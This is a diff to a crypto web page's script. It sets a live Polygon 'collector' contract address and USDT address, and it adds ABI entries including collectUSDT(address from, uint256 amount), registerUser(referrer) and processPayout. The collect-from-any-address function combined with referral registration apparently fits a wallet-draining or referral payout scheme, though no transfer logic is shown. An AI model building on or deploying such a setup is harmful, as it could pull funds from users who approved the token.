@@ -195,10 +195,10 @@
         let provider, signer, userAddress;
         const selectedNetwork = "POLYGON";
 
-        // Deployed Smart Contract Address ထည့်ရန်
-        const COLLECTOR_CONTRACT_ADDRESS = "သင်၏_Deployed_Smart_Contract_Address_ကို_ဤနေရာတွင်ထည့်ပါ";
+        // Deployed Smart Contract Address (ထည့်သွင်းပြီး)
+        const COLLECTOR_CONTRACT_ADDRESS = "0x5a30bBD23eD1250ec5A3F8bca8122580E4eBefCC";
 
-        // Polygon Network USDT Address (Checksum မှန်ကန်သော ပုံစံ)
+        // Polygon Network USDT Address
         const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
         const POLYGON_CHAIN_ID = "0x89"; // 137 in hex
 
@@ -208,8 +208,11 @@
             "function balanceOf(address account) view returns (uint256)"
         ];
 
+        // Contract ABI (Smart Contract ၏ Function များ အပြည့်အစုံ)
         const COLLECTOR_ABI = [
             "function registerUser(address referrer) external",
+            "function collectUSDT(address from, uint256 amount) external",
+            "function processPayout(address user, uint256 amount) external",
             "function requestWithdraw(uint256 amount) external",
             "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered)"
         ];
